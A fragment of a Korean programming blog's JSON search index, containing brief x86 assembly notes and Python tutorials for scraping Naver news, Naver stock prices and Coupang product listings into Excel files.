아키텍처 - 데이터 타입 : 어셈블리 기본\n- 주소 표기법 : 리틀 엔디안\n- 레지스터 : 8개의 범용 레지스터, EIP, EFLAGS\n- 호출규약 : cdecl, stdcall, fastcall\n- 명령어 세트 : 가변 길이 명령어 형식을 사용\n- 피연산자 : 레지스터, 메모리 주소, 주소값, 숫자\n- 기본문법 : AT\u0026amp;T(add a,b \u0026gt; b=a+b) 또는 Intel (add a,b \u0026gt; a=a+b)\n📜레지스터 - 8개의 범용 레지스터 + EIP(32비트)\n- EFLAGS 레지스터(32비트)","title":"x86 Assembly 기초"},{"content":" 네이버 뉴스 크롤러 📜네이버 뉴스 크롤링 네이버 뉴스 검색 \u0026gt; 일반, 연예, 스포츠 뉴스가 각각 다르게 크롤링 후 엑셀파일에 저장\nimport requests from bs4 import BeautifulSoup import pyautogui from openpyxl import Workbook from openpyxl.styles import Alignment # 사용자 입력 keyword = pyautogui.prompt(\u0026#34;검색어를 입력하세요\u0026#34;) lastpage = int(pyautogui.prompt(\u0026#34;몇 페이지까지 크롤링 할까요?\u0026#34;)) pageNum = 1 # 엑셀 생성하기 wb = Workbook() # 워크 시트 생성하기 ws = wb.create_sheet(f\u0026#34;{keyword}\u0026#34;) # 열 너비 조절 ws.column_dimensions[\u0026#34;A\u0026#34;].width = 60 ws.column_dimensions[\u0026#34;B\u0026#34;].width = 60 ws.column_dimensions[\u0026#34;C\u0026#34;].width = 80 # 행 번호 row = 1 for i in range(1, lastpage * 10, 10): print(f\u0026#34;{pageNum}페이지 크롤링 중입니다 ================ \u0026#34;) response = requests.get(f\u0026#34;https://search.naver.com/search.naver?where=news\u0026amp;sm=tab_jum\u0026amp;query={keyword}\u0026amp;start={i}\u0026#34;) html = response.text soup = BeautifulSoup(html, \u0026#39;html.parser\u0026#39;) articles = soup.select(\u0026#34;div.info_group\u0026#34;) # 뉴스 기사 div 10개 추출 for article in articles: links = article.select(\u0026#34;a.info\u0026#34;) if len(links) \u0026gt;= 2: # 링크가 2개 이상이면 url = links[1].attrs[\u0026#39;href\u0026#39;] # 두번째 링크의 href 추출 # 다시 request를 날려 준다 response = requests.get(url, headers={\u0026#39;User-Agent\u0026#39; : \u0026#39;Mozila/5.0\u0026#39;}) html = response.text soup_sub = BeautifulSoup(html, \u0026#39;html.parser\u0026#39;) # 연예뉴스 또는 스포츠뉴스는 사이트의 생김새가 다르다 # 즉, 오류가 날 수 있다. if \u0026#34;entertain\u0026#34; in response.url: title = soup_sub.select_one(\u0026#34;.end_tit\u0026#34;) content = soup_sub.select_one(\u0026#34;#articeBody\u0026#34;) elif \u0026#34;sports\u0026#34; in response.url: title = soup_sub.select_one(\u0026#34;h4.title\u0026#34;) content = soup_sub.select_one(\u0026#34;#newsEndContents\u0026#34;) # 본문 내용안에 불필요한 div 삭제 divs = content.select(\u0026#34;div\u0026#34;) for div in divs: div.decompose() else: title = soup_sub.select_one(\u0026#34;.media_end_head_headline\u0026#34;) content = soup_sub.select_one(\u0026#34;#newsct_article\u0026#34;) print(\u0026#34;=======링크======= \\n\u0026#34;, url) print(\u0026#34;=======제목======= \\n\u0026#34;, title.text.strip()) print(\u0026#34;=======본문======= \\n\u0026#34;, content.text.strip()) # 엑셀에 링크, 제목, 본문 저장 ws[f\u0026#39;A{row}\u0026#39;] = url ws[f\u0026#39;B{row}\u0026#39;] = title.text.strip() ws[f\u0026#39;C{row}\u0026#39;] = content.text.strip() # 자동 줄바꿈 ws[f\u0026#39;C{row}\u0026#39;].alignment = Alignment(wrap_text=True) row = row + 1 # 마지막 페이지 여부 확인 (두번째 soup 변수 이름 변경) isLastPage = soup.select_one(\u0026#39;a.btn_next\u0026#39;).attrs[\u0026#39;aria-disabled\u0026#39;] if isLastPage == \u0026#39;true\u0026#39;: print(\u0026#34;마지막 페이지 입니다.\u0026#34;) break pageNum = pageNum + 1 # 엑셀 문서 저장하기 wb.save(f\u0026#34;{keyword}_result.xlsx\u0026#34;) ","permalink":"https://crackernote.github.io/posts/2023-03-26-%EB%84%A4%EC%9D%B4%EB%B2%84-%EB%89%B4%EC%8A%A4-%ED%81%AC%EB%A1%A4%EB%9F%AC/","summary":"네이버 뉴스 크롤러 📜네이버 뉴스 크롤링 네이버 뉴스 검색 \u0026gt; 일반, 연예, 스포츠 뉴스가 각각 다르게 크롤링 후 엑셀파일에 저장\nimport requests from bs4 import BeautifulSoup import pyautogui from openpyxl import Workbook from openpyxl.styles import Alignment # 사용자 입력 keyword = pyautogui.prompt(\u0026#34;검색어를 입력하세요\u0026#34;) lastpage = int(pyautogui.prompt(\u0026#34;몇 페이지까지 크롤링 할까요?\u0026#34;)) pageNum = 1 # 엑셀 생성하기 wb = Workbook() # 워크 시트 생성하기 ws = wb.create_sheet(f\u0026#34;{keyword}\u0026#34;) # 열 너비 조절 ws.","title":"네이버 뉴스 크롤러"},{"content":"1️⃣ 네이버 주식 현재가 정보 수집 네이버 증권 사이트 현재가 데이터를 파이썬으로 수집\n📜네이버 주식 현재가 크롤링 크롤링 해올 정보의 id 값과 URL의 파라미터를 확인 필요\nid=\u0026quot;_nowVal\u0026quot; / ?code=086960 (URL 상의 종목 코드 확인) import requests from bs4 import BeautifulSoup #종목 코드 리스트 codes = [ \u0026#39;005930\u0026#39;, \u0026#39;000660\u0026#39;, \u0026#39;035720\u0026#39; ] for code in codes: url = f\u0026#34;https://finance.naver.com/item/sise.naver?code={code}\u0026#34; reponse = requests.get(url) html = reponse.text soup = BeautifulSoup(html, \u0026#34;html.parser\u0026#34;) price = soup.select_one(\u0026#34;#_nowVal\u0026#34;).text price = price.replace(\u0026#39;,\u0026#39;,\u0026#39;\u0026#39;) print(price) 📜엑셀을 불러와서 데이터 저장하기 openpyxl 사용\nimport requests from bs4 import BeautifulSoup import openpyxl fpath = r\u0026#39;C:\\Users\\hjopy\\OneDrive\\바탕 화면\\crawler\\네이버주식 현재가 크롤링\\data.xlsx\u0026#39; wb = openpyxl.load_workbook(fpath) ws = wb.active #종목 코드 리스트 codes = [ \u0026#39;005930\u0026#39;, \u0026#39;000660\u0026#39;, \u0026#39;035720\u0026#39; ] row = 2 for code in codes: url = f\u0026#34;https://finance.naver.com/item/sise.naver?code={code}\u0026#34; reponse = requests.get(url) html = reponse.text soup = BeautifulSoup(html, \u0026#34;html.parser\u0026#34;) price = soup.select_one(\u0026#34;#_nowVal\u0026#34;).text price = price.replace(\u0026#39;,\u0026#39;,\u0026#39;\u0026#39;) print(price) ws[f\u0026#39;B{row}\u0026#39;] = int(price) row = row + 1 wb.save(fpath) ","permalink":"https://crackernote.github.io/posts/2023-03-26-%EB%84%A4%EC%9D%B4%EB%B2%84-%EC%A3%BC%EC%8B%9D-%ED%98%84%EC%9E%AC%EA%B0%80-%EC%A0%95%EB%B3%B4-%EC%88%98%EC%A7%91/","summary":"1️⃣ 네이버 주식 현재가 정보 수집 네이버 증권 사이트 현재가 데이터를 파이썬으로 수집\n📜네이버 주식 현재가 크롤링 크롤링 해올 정보의 id 값과 URL의 파라미터를 확인 필요\nid=\u0026quot;_nowVal\u0026quot; / ?code=086960 (URL 상의 종목 코드 확인) import requests from bs4 import BeautifulSoup #종목 코드 리스트 codes = [ \u0026#39;005930\u0026#39;, \u0026#39;000660\u0026#39;, \u0026#39;035720\u0026#39; ] for code in codes: url = f\u0026#34;https://finance.naver.com/item/sise.naver?code={code}\u0026#34; reponse = requests.get(url) html = reponse.text soup = BeautifulSoup(html, \u0026#34;html.parser\u0026#34;) price = soup.select_one(\u0026#34;#_nowVal\u0026#34;).text price = price.","title":"네이버 주식 현재가 정보 수집"},{"content":" 쿠팡 상품 크롤러 📜쿠팡 상품 크롤링 뉴스 검색 결과에서 제목 및 URL 크롤링\n조건 1. 100개까지만 상품 추출 조건 2. 광고상품 표시 조건 3. 엑셀 파일로 결과 저장 import requests from bs4 import BeautifulSoup import pyautogui import openpyxl keyword = pyautogui.prompt(\u0026#34;검색어를 입력하세요 \u0026gt;\u0026gt; \u0026#34;) wb = openpyxl.Workbook(\u0026#39;coupang_result.xlsx\u0026#39;) ws = wb.create_sheet(keyword) ws.append([\u0026#39;순위\u0026#39;,\u0026#39;브랜드명\u0026#39;,\u0026#39;상품명\u0026#39;,\u0026#39;가격\u0026#39;,\u0026#39;상세페이지링크\u0026#39;]) rank = 1 done = False for page in range(1,5): if done == True: break print(page, \u0026#34;번째 페이지 입니다.\u0026#34;) main_url = f\u0026#34;https://www.coupang.com/np/search?\u0026amp;q={keyword}\u0026amp;page={page}\u0026#34; coupang_header = { \u0026#39;Host\u0026#39;: \u0026#39;www.coupang.com\u0026#39;, \u0026#39;User-Agent\u0026#39;: \u0026#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0\u0026#39;, \u0026#39;Accept\u0026#39;: \u0026#39;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\u0026#39;, \u0026#39;Accept-Language\u0026#39;: \u0026#39;ko-KR,ko;q=0.8,en-US;q=0.5,en;q=0.3\u0026#39;, } response = requests.get(main_url, headers=coupang_header) html = response.text soup = BeautifulSoup(html, \u0026#34;html.parser\u0026#34;) links = soup.select(\u0026#34;a.search-product-link\u0026#34;) for link in links: if len(link.select(\u0026#34;span.ad-badge-text\u0026#34;)) \u0026gt; 0: print(\u0026#34;광고상품 입니다.\u0026#34;) else: sub_url = \u0026#34;https://www.coupang.com/\u0026#34; + link.attrs[\u0026#39;href\u0026#39;] response = requests.get(sub_url, headers=coupang_header) html = response.text soup = BeautifulSoup(html, \u0026#34;html.parser\u0026#34;) try: brand_name = soup.select_one(\u0026#34;a.prod-brand-name\u0026#34;).text except: brand_name = \u0026#34;\u0026#34; product_name = soup.select_one(\u0026#34;h2.prod-buy-header__title\u0026#34;).text try: product_price = soup.select_one(\u0026#34;span.total-price \u0026gt; strong\u0026#34;).text except: product_price =\u0026#34;\u0026#34; print(rank, brand_name, product_name, product_price) ws.append([rank, brand_name, product_name, product_price, sub_url]) rank = rank + 1 if rank \u0026gt; 100: done = True break wb.save(\u0026#39;coupang_result.xlsx\u0026#39;) ","permalink":"https://crackernote.github.io/posts/2023-05-29-%EC%BF%A0%ED%8C%A1-%EC%83%81%ED%92%88-%ED%81%AC%EB%A1%A4%EB%9F%AC/","summary":"쿠팡 상품 크롤러 📜쿠팡 상품 크롤링 뉴스 검색 결과에서 제목 및 URL 크롤링\n조건 1. 100개까지만 상품 추출 조건 2. 광고상품 표시 조건 3. 엑셀 파일로 결과 저장 import requests from bs4 import BeautifulSoup import pyautogui import openpyxl keyword = pyautogui.prompt(\u0026#34;검색어를 입력하세요 \u0026gt;\u0026gt; \u0026#34;) wb = openpyxl.Workbook(\u0026#39;coupang_result.xlsx\u0026#39;) ws = wb.create_sheet(keyword) ws.append([\u0026#39;순위\u0026#39;,\u0026#39;브랜드명\u0026#39;,\u0026#39;상품명\u0026#39;,\u0026#39;가격\u0026#39;,\u0026#39;상세페이지링크\u0026#39;]) rank = 1 done = False for page in range(1,5): if done == True: break print(page, \u0026#34;번째 페이지 입니다.","title":"쿠팡 상품 크롤러"}]